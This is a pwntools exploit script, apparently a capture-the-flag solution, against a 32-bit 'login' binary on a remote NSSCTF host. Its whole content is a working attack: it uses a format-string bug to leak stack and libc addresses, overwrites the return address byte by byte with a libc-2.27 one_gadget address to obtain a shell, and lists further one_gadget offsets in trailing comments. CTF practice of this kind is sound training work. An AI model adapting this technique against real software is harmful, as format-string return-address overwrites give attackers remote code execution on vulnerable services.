from pwn import *
# context(log_level='debug',arch='x86',terminal=['tmux','splitw','-h'])
context(terminal=['tmux','splitw','-h'])

io=remote("node1.anna.nssctf.cn",28348)
# io=process("./login")
elf=ELF("./login")
libc=ELF("./libc-2.27.so")

# gdb.attach(io)
# pause()

sh_addr=0x804b080
io.sendafter(b"name: \n",b"/bin/sh\x00")
io.recvuntil(b"word: \n")

# 6 15

payload=b"%6$p.%15$p"
io.send(payload)
io.recvuntil(b"password: ")
stack_addr=int(io.recv(10),16)
io.recvuntil(b".")
leak_addr=int(io.recv(10),16)-241-libc.sym[b"__libc_start_main"]
ret_addr=stack_addr+0x24
shell=leak_addr+0x3cbf7

print("stack_addr: "+hex(stack_addr))
print("ret_addr: "+hex(ret_addr))
print("leak_addr: "+hex(leak_addr))
print("shell: "+hex(shell))

io.recvuntil(b"again!\n")
payload="%{}c%{}$hn".format(ret_addr&0xffff,22)
io.send(payload)

io.recvuntil(b"again!\n")
payload="%{}c%{}$hhn".format(shell&0xff,59)
io.send(payload)


io.recvuntil(b"again!\n")
payload="%{}c%{}$hhn".format((ret_addr+1)&0xff,22)
io.send(payload)

io.recvuntil(b"again!\n")
payload="%{}c%{}$hhn".format((shell>>8)&0xff,59)
io.send(payload)


io.recvuntil(b"again!\n")
payload="%{}c%{}$hhn".format((ret_addr+2)&0xff,22)
io.send(payload)

io.recvuntil(b"again!\n")
payload="%{}c%{}$hhn".format((shell>>16)&0xff,59)
io.send(payload)


io.recvuntil(b"again!\n")
io.send(b"wllmmllw")

io.interactive()

# 0x3cbea execve("/bin/sh", esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x3cbec execve("/bin/sh", esp+0x38, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x38] == NULL

# 0x3cbf0 execve("/bin/sh", esp+0x3c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x3c] == NULL

# 0x3cbf7 execve("/bin/sh", esp+0x40, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x40] == NULL

# 0x6729f execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x672a0 execl("/bin/sh", [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL

# 0x13573e execl("/bin/sh", eax)
# constraints:
#   ebx is the GOT address of libc
#   eax == NULL

# 0x13573f execl("/bin/sh", [esp])
# constraints:
#   ebx is the GOT address of libc
#   [esp] == NULL
